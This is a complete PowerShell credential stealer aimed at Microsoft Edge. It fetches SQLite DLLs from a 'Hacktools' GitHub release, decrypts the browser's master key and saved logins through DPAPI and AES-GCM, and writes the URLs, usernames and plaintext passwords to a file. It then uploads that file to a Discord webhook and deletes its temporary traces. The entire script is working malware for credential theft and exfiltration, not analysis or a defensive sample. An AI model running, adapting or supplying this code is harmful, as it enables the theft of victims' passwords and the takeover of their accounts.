# Check current PowerShell version
if ($PSVersionTable.PSVersion.Major -lt 7) {
    # Check if pwsh is available
    $pwshCmd = Get-Command pwsh -ErrorAction SilentlyContinue
    if ($pwshCmd) {
        $pwshPath = $pwshCmd.Source
        Write-Host "Restarting script in PowerShell 7 ($pwshPath)..."
        & $pwshPath -NoProfile -ExecutionPolicy Bypass -File $PSCommandPath @args
        exit
    }
    else {
        Write-Warning "PowerShell 7 (pwsh) not found. Falling back to DPAPI-only decryption."
        # Continue running script in PS5 but only DPAPI decryption will be used
    }
}

# URLs for SQLite DLLs (64-bit)
$sqliteInteropUrl = "https://github.com/BlueJuice1/Hacktools/releases/download/V1.0/SQLite.Interop.dll"
$sqliteNetUrl = "https://github.com/BlueJuice1/Hacktools/releases/download/V1/System.Data.SQLite.dll"

# Create and use temp directory for all temp files and output
$tempDir = "$env:TEMP\BrowserExfil"
if (-not (Test-Path $tempDir)) { New-Item -ItemType Directory -Path $tempDir | Out-Null }

$interopPath = Join-Path $tempDir "SQLite.Interop.dll"
$netDllPath = Join-Path $tempDir "System.Data.SQLite.dll"

# Download DLLs if missing
if (-not (Test-Path $interopPath)) {
    Write-Host "Downloading SQLite.Interop.dll..."
    Invoke-WebRequest -Uri $sqliteInteropUrl -OutFile $interopPath -UseBasicParsing
} else {
    Write-Host "SQLite.Interop.dll already downloaded."
}
if (-not (Test-Path $netDllPath)) {
    Write-Host "Downloading System.Data.SQLite.dll..."
    Invoke-WebRequest -Uri $sqliteNetUrl -OutFile $netDllPath -UseBasicParsing
} else {
    Write-Host "System.Data.SQLite.dll already downloaded."
}

Write-Host "Loading SQLite assembly..."
Add-Type -Path $netDllPath

# Add DPAPI decryption type only if not already loaded
if (-not ("DPAPI" -as [type])) {
    Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class DPAPI {
    [DllImport("crypt32.dll", SetLastError=true, CharSet=CharSet.Auto)]
    private static extern bool CryptUnprotectData(ref DATA_BLOB pDataIn, string szDataDescr, ref DATA_BLOB pOptionalEntropy,
        IntPtr pvReserved, IntPtr pPromptStruct, int dwFlags, ref DATA_BLOB pDataOut);

    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
    internal struct DATA_BLOB {
        public int cbData;
        public IntPtr pbData;
    }

    public static byte[] Decrypt(byte[] encryptedData) {
        DATA_BLOB encryptedBlob = new DATA_BLOB();
        DATA_BLOB decryptedBlob = new DATA_BLOB();
        DATA_BLOB entropyBlob = new DATA_BLOB();

        try {
            encryptedBlob.cbData = encryptedData.Length;
            encryptedBlob.pbData = Marshal.AllocHGlobal(encryptedData.Length);
            Marshal.Copy(encryptedData, 0, encryptedBlob.pbData, encryptedData.Length);

            bool success = CryptUnprotectData(ref encryptedBlob, null, ref entropyBlob, IntPtr.Zero, IntPtr.Zero, 0, ref decryptedBlob);
            if (!success) throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());

            byte[] decryptedData = new byte[decryptedBlob.cbData];
            Marshal.Copy(decryptedBlob.pbData, decryptedData, 0, decryptedBlob.cbData);

            return decryptedData;
        }
        finally {
            if (encryptedBlob.pbData != IntPtr.Zero) Marshal.FreeHGlobal(encryptedBlob.pbData);
            if (decryptedBlob.pbData != IntPtr.Zero) Marshal.FreeHGlobal(decryptedBlob.pbData);
        }
    }
}
"@
} else {
    Write-Host "DPAPI type already loaded."
}

function Get-EdgeMasterKey {
    param(
        [string]$localStatePath
    )
    if (-not (Test-Path $localStatePath)) {
        Write-Warning "Local State file not found: $localStatePath"
        return $null
    }
    $localStateJson = Get-Content $localStatePath -Raw | ConvertFrom-Json
    $encryptedKeyBase64 = $localStateJson.os_crypt.encrypted_key
    if (-not $encryptedKeyBase64) {
        Write-Warning "Encrypted key not found in Local State."
        return $null
    }
    # The key has "DPAPI" prefix, remove it
    $keyBytes = [Convert]::FromBase64String($encryptedKeyBase64)
    # Remove first 5 bytes ("DPAPI")
    $keyBytes = $keyBytes[5..($keyBytes.Length - 1)]

    try {
        # Decrypt using DPAPI
        $masterKey = [DPAPI]::Decrypt($keyBytes)
        return $masterKey
    }
    catch {
        Write-Warning "Failed to decrypt master key from Local State."
        return $null
    }
}

function Decrypt-EdgePassword {
    param(
        [byte[]]$encryptedData,
        [byte[]]$masterKey
    )

    $psMajorVersion = $PSVersionTable.PSVersion.Major

    # Only attempt AES-GCM if PowerShell 7 or higher
    if ($psMajorVersion -ge 7) {
        if ($encryptedData.Length -ge 3) {
            $prefix = [System.Text.Encoding]::ASCII.GetString($encryptedData, 0, 3)
            if ($prefix -eq "v10" -or $prefix -eq "v11") {
                if (-not $masterKey) {
                    return "[Missing master key for AES-GCM decryption]"
                }
                try {
                    # Strip prefix
                    $encryptedPayload = $encryptedData[3..($encryptedData.Length - 1)]
                    # Structure: [nonce (12 bytes)] + [ciphertext] + [tag (16 bytes)]
                    $nonce = $encryptedPayload[0..11]
                    $ciphertextWithTag = $encryptedPayload[12..($encryptedPayload.Length - 1)]

                    # Separate ciphertext and tag
                    $tag = $ciphertextWithTag[($ciphertextWithTag.Length - 16)..($ciphertextWithTag.Length - 1)]
                    $ciphertext = $ciphertextWithTag[0..($ciphertextWithTag.Length - 17)]

                    $aesGcm = [System.Security.Cryptography.AesGcm]::new($masterKey)
                    $plaintext = New-Object byte[] $ciphertext.Length

                    $aesGcm.Decrypt($nonce, $ciphertext, $tag, $plaintext, $null)

                    return [System.Text.Encoding]::UTF8.GetString($plaintext)
                }
                catch {
                    return "[AES-GCM decryption failed]"
                }
            }
        }
    }

    # Otherwise, fallback to DPAPI decrypt (older versions or no master key)
    try {
        $decryptedBytes = [DPAPI]::Decrypt($encryptedData)
        return [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
    }
    catch {
        return "[DPAPI decryption failed]"
    }
}

function Extract-EdgePasswords {
    param(
        [string]$loginDataPath,
        [string]$localStatePath
    )

    if (-not ((Test-Path $loginDataPath) -and (Test-Path $localStatePath))) {
        Write-Warning "Edge data files not found."
        return @()
    }

    $masterKey = Get-EdgeMasterKey -localStatePath $localStatePath

    # Copy login data DB to temp to avoid lock issues
    $tempDb = Join-Path $tempDir "Edge-LoginData-copy"
    Copy-Item -Path $loginDataPath -Destination $tempDb -Force

    # Open SQLite connection
    $connString = "Data Source=$tempDb;Version=3;Read Only=True;"
    $conn = New-Object System.Data.SQLite.SQLiteConnection $connString
    $conn.Open()

    $cmd = $conn.CreateCommand()
    $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"

    $reader = $cmd.ExecuteReader()

    $results = @()

    while ($reader.Read()) {
        $url = $reader["origin_url"]
        $username = $reader["username_value"]
        $encryptedData = $reader["password_value"]

        # Convert encryptedData to byte array (SQLite blob)
        $bytes = [byte[]]$encryptedData

        $password = Decrypt-EdgePassword -encryptedData $bytes -masterKey $masterKey

        $results += [pscustomobject]@{
            Browser = "Edge"
            URL = $url
            Username = $username
            Password = $password
        }
    }

    # Clean up
    $reader.Close()
    $reader.Dispose()
    $cmd.Dispose()
    $conn.Close()
    $conn.Dispose()

    # Delete temp DB copy safely
    Start-Sleep -Milliseconds 200
    $maxRetries = 5
    $retry = 0
    while ($retry -lt $maxRetries) {
        try {
            Remove-Item -Path $tempDb -Force -ErrorAction Stop
            break
        }
        catch {
            $retry++
            if ($retry -eq $maxRetries) {
                Write-Warning "Could not delete temp DB copy: $tempDb after $maxRetries attempts."
            }
            else {
                Start-Sleep -Milliseconds 300
            }
        }
    }

    return $results
}

# Paths for Edge
$edgeUser = Join-Path $env:LOCALAPPDATA "Microsoft\Edge\User Data\Default"
$edgeLoginData = Join-Path $edgeUser "Login Data"
$edgeLocalState = Join-Path $env:LOCALAPPDATA "Microsoft\Edge\User Data\Local State"

# Extract Edge passwords
$edgeResults = Extract-EdgePasswords -loginDataPath $edgeLoginData -localStatePath $edgeLocalState

# Output to file in temp directory instead of Desktop
$outputFile = Join-Path $tempDir "EdgePasswords.txt"

$edgeResults | ForEach-Object {
    "Browser: $($_.Browser)" + "`r`n" +
    "URL: $($_.URL)" + "`r`n" +
    "Username: $($_.Username)" + "`r`n" +
    "Password: $($_.Password)" + "`r`n" + "------------------------------------"
} | Out-File -FilePath $outputFile -Encoding utf8

Write-Host "Passwords saved to: $outputFile"

# Get webhook URL from environment variable
$webhookUrl = $env:DISCORD_WEBHOOK_URL

if ([string]::IsNullOrEmpty($webhookUrl)) {
    Write-Error "No webhook URL set. Exiting."
    exit 1
}

# Send to Discord webhook using Invoke-RestMethod -Form to upload file properly
if (Test-Path $outputFile) {
    $form = @{
        content = "Extracted Edge Passwords:"
        file = Get-Item $outputFile
    }
    try {
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Form $form
        Write-Host "Sent passwords to Discord webhook."
    }
    catch {
        Write-Warning "Failed to send data to Discord webhook: $_"
    }
}
else {
    Write-Warning "Output file not found: $outputFile"
}

# Cleanup temp folder, but skip DLL files if locked
Write-Host "Cleaning up temp files..."

# Try removing files except SQLite DLLs (may be locked)
Get-ChildItem -Path $tempDir | ForEach-Object {
    if ($_.Name -notmatch "SQLite.Interop.dll|System.Data.SQLite.dll") {
        try {
            Remove-Item -Path $_.FullName -Force -Recurse -ErrorAction Stop
        }
        catch {
            Write-Warning "Could not delete file: $($_.FullName)"
        }
    }
}

Write-Host "Done."
